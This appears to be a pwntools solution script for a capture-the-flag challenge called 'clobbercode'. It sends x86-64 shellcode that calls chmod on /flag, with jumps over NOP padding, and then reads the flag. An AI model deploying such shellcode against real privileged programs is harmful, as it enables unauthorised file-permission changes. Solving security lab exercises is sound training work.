#!/usr/bin/env python3
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = "debug"

target_binary = "/challenge/clobbercode"

payload_asm = """
.intel_syntax noprefix

xor eax, eax
push rax
mov eax, 0x67616c66
jmp b2

.rept 10
nop
.endr

b2:
shl rax, 8
mov al, 0x2f
nop
nop
jmp b3

.rept 10
nop
.endr

b3:
push rax
push rsp
pop rdi
push 4
pop rsi
nop
nop
jmp b4

.rept 10
nop
.endr

b4:
push 90
pop rax
syscall
"""

payload = asm(payload_asm)
log.info(f"Generated Payload Size: {len(payload)} bytes")

p = process(target_binary)
p.send(payload)
p.wait()

import os
os.system("cat /flag")
